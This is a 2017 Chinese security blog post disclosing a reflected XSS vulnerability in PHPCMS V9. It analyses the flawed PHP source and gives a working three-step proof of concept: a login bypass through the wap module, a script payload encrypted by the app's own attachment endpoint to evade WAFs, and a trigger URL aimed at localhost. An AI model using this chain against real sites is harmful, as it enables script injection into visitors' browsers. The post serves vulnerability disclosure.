<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> PHPCMS V9全版本反射型XSS · WangEX`s Blog</title><meta name="description" content="PHPCMS V9全版本反射型XSS - wangex"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://goodwaf.com/atom.xml" title="WangEX`s Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">PHPCMS V9全版本反射型XSS</h1><div class="post-info">2017年4月21日</div><div class="post-content"><h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><p>这个XSS漏洞是由于PHPCMS的cookie可以由用户控制，而在输出时又没有进行过滤所造成。而且该漏洞的payload是经过加密的，无视WAF检测。<br><a id="more"></a></p>
<h4 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h4><p>漏洞文件在phpcms\modules\content\down.php中的init函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">unset</span>($i,$m,$f);</div><div class="line">	parse_str($a_k);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">	$allow_visitor = <span class="number">1</span>;</div><div class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</div><div class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</div><div class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</div><div class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));	</div><div class="line">	$siteids = getcache(<span class="string">'category_content'</span>,<span class="string">'commons'</span>);</div><div class="line">	$siteid = $siteids[$catid];</div><div class="line">	$CATEGORYS = getcache(<span class="string">'category_content_'</span>.$siteid,<span class="string">'commons'</span>);</div><div class="line"></div><div class="line">	<span class="keyword">$this</span>-&gt;category = $CATEGORYS[$catid];</div><div class="line">	<span class="keyword">$this</span>-&gt;category_setting = string2array(<span class="keyword">$this</span>-&gt;category[<span class="string">'setting'</span>]);</div><div class="line">	</div><div class="line">	<span class="comment">//检查文章会员组权限</span></div><div class="line">	$groupids_view = <span class="string">''</span>;</div><div class="line">	<span class="keyword">if</span> ($rs[<span class="string">'groupids_view'</span>]) $groupids_view = explode(<span class="string">','</span>, $rs[<span class="string">'groupids_view'</span>]);</div><div class="line">	<span class="keyword">if</span>($groupids_view &amp;&amp; is_array($groupids_view)) &#123;</div><div class="line">		$_groupid = param::get_cookie(<span class="string">'_groupid'</span>);</div><div class="line">		$_groupid = intval($_groupid);</div><div class="line">		<span class="keyword">if</span>(!$_groupid) &#123;</div><div class="line">			$forward = urlencode(get_url());</div><div class="line">			showmessage(L(<span class="string">'login_website'</span>),APP_PATH.<span class="string">'index.php?m=member&amp;c=index&amp;a=login&amp;forward='</span>.$forward);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(!in_array($_groupid,$groupids_view)) showmessage(L(<span class="string">'no_priv'</span>));</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="comment">//根据栏目访问权限判断权限</span></div><div class="line">		$_priv_data = <span class="keyword">$this</span>-&gt;_category_priv($catid);</div><div class="line">		<span class="keyword">if</span>($_priv_data==<span class="string">'-1'</span>) &#123;</div><div class="line">			$forward = urlencode(get_url());</div><div class="line">			showmessage(L(<span class="string">'login_website'</span>),APP_PATH.<span class="string">'index.php?m=member&amp;c=index&amp;a=login&amp;forward='</span>.$forward);</div><div class="line">		&#125; <span class="keyword">elseif</span>($_priv_data==<span class="string">'-2'</span>) &#123;</div><div class="line">			showmessage(L(<span class="string">'no_priv'</span>));</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//阅读收费 类型</span></div><div class="line">	$paytype = $rs[<span class="string">'paytype'</span>];</div><div class="line">	$readpoint = $rs[<span class="string">'readpoint'</span>];</div><div class="line">	<span class="keyword">if</span>($readpoint || <span class="keyword">$this</span>-&gt;category_setting[<span class="string">'defaultchargepoint'</span>]) &#123;</div><div class="line">		<span class="keyword">if</span>(!$readpoint) &#123;</div><div class="line">			$readpoint = <span class="keyword">$this</span>-&gt;category_setting[<span class="string">'defaultchargepoint'</span>];</div><div class="line">			$paytype = <span class="keyword">$this</span>-&gt;category_setting[<span class="string">'paytype'</span>];</div><div class="line">		&#125;		</div><div class="line">		<span class="comment">//检查是否支付过</span></div><div class="line">		$allow_visitor = <span class="keyword">self</span>::_check_payment($catid.<span class="string">'_'</span>.$id,$paytype,$catid);</div><div class="line">		<span class="keyword">if</span>(!$allow_visitor) &#123;</div><div class="line">			$http_referer = urlencode(get_url());</div><div class="line">			$allow_visitor = sys_auth($catid.<span class="string">'_'</span>.$id.<span class="string">'|'</span>.$readpoint.<span class="string">'|'</span>.$paytype).<span class="string">'&amp;http_referer='</span>.$http_referer;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			$allow_visitor = <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$f) || strpos($f, <span class="string">":\\"</span>)!==<span class="keyword">FALSE</span> || strpos($f,<span class="string">'..'</span>)!==<span class="keyword">FALSE</span>) showmessage(L(<span class="string">'url_error'</span>));</div><div class="line">	<span class="keyword">if</span>(strpos($f, <span class="string">'http://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'ftp://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'://'</span>) === <span class="keyword">FALSE</span>) &#123;</div><div class="line">		$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</div><div class="line">		$a_k = urlencode(sys_auth(<span class="string">"i=$i&amp;d=$d&amp;s=$s&amp;t="</span>.SYS_TIME.<span class="string">"&amp;ip="</span>.ip().<span class="string">"&amp;m="</span>.$m.<span class="string">"&amp;f=$f&amp;modelid="</span>.$modelid, <span class="string">'ENCODE'</span>, $pc_auth_key));</div><div class="line">		$downurl = <span class="string">'?m=content&amp;c=down&amp;a=download&amp;a_k='</span>.$a_k;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$downurl = $f;			</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">include</span> template(<span class="string">'content'</span>,<span class="string">'download'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>看该函数的最后一行引入了模版文件。再看模版文件里的内容：<br><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php defined('IN_PHPCMS') or exit('No permission resources.'); ?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</div><div class="line">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;</div><div class="line">&lt;meta http-equiv="X-UA-Compatible" content="IE=7" /&gt;</div><div class="line">&lt;title&gt;&lt;?php echo $catname;?&gt;- 下载频道_详情页&lt;/title&gt;</div></pre></td></tr></table></figure></p>
<p>模版文件中很简单的将变量的值填充进去，如果我们能控制这些值就可以达到xss的目的。再回到init()函数，我们看到函数的开头从\$_GET中获取a_k的值，经过解密后使用parse_str注册了变量。payload就是由此处传入，再看可以构造出payload的地方：phpcms\modules\attachment\attachments.php中的swfupload_json函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</div><div class="line">	$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</div><div class="line">	$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</div><div class="line">	$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</div><div class="line">	$json_str = json_encode($arr);</div><div class="line">	$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</div><div class="line">	$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</div><div class="line">	<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</div><div class="line">		param::set_cookie(<span class="string">'att_json'</span>,$json_str);</div><div class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;			</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到$arr的值是可以由我们控制的，那么只要我们在这里传如payload，然后该函数就会把payload加密后再设置为cookie返回回来。由此我们就可以得到加密后的payload。但是由于在attachments类的构造函数中会检查用户是否登录，所以我们为了方便还要先访问一下wap模块生成userid，以绕过登录检测（无论wap模块是否开启都可以生成）。</p>
<h4 id="三、验证"><a href="#三、验证" class="headerlink" title="三、验证"></a>三、验证</h4><ol>
<li><p>访问wap模块获得cookie值：XXX_siteid</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?m=wap&amp;c=index&amp;siteid=1</div></pre></td></tr></table></figure>
</li>
<li><p>访问attachment模块获得cookie值：XXX_att_json（userid_flash的值是由第一步得到的）</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">URL</span>: 127.0.0.1/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3D1%26m%3D1%26f%3D1%26modelid%3D1%26catid%3D1%26s%3D%26i%3D1%26d%3D1%26catname%3D%253C%252ftitle%253E%253Cscript%253Ealert%25281%2529%253B%253C%252fscript%253E%253Ctitle%253E%26</div><div class="line"><span class="attribute">POST</span>: userid_flash=f631g3wR9zEIAPVBul-pHNt8FiwJinnnRH-NwIJ9</div></pre></td></tr></table></figure>
</li>
<li><p>访问content模块触发漏洞（a_k的值是由第二步得到的）</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1/index.php?m=content&amp;c=down&amp;a_k=4ee9GvW3Ioad2Tqr9pYHoOdv9FSbuHJAFLSGnrZtA6m0Du2qebVx3ZJ1JDDfLY3PKECyB3ot9W7dWz8xZ9jXHNbTGMr_tbSH39hmWytxgaIkfCe3RNMFhlM8bCMMG6VGM7dSaGY5AGohtKZux15poTC36ak3zkYgzDsvBdASYGBS7-aScCmDEb1kWQ69H7J_r_C48qiByr7uvSmEG2SqbxTXNu1MJw0DB-SN4GrVh2Bb1ILf</div></pre></td></tr></table></figure>
</li>
<li><p>只要其他人访问了步骤3中的url即可中招</p>
</li>
</ol>
<h4 id="四、影响范围"><a href="#四、影响范围" class="headerlink" title="四、影响范围"></a>四、影响范围</h4><p>PHPCMS V9 所有子版本（包括最近更新的V9.6.1）</p>
</div></article></div></main><footer><div class="paginator"><a href="/2017/04/21/phpcms_file_down/" class="next">NEXT</a></div><div data-thread-key="2017/04/21/phpcms_xss/" data-title="PHPCMS V9全版本反射型XSS" data-url="http://goodwaf.com/2017/04/21/phpcms_xss/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
(function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
     || document.getElementsByTagName('body')[0]).appendChild(ds);
})();

</script><div class="copyright"><p>© 2015 - 2017 <a href="http://goodwaf.com">wangex</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>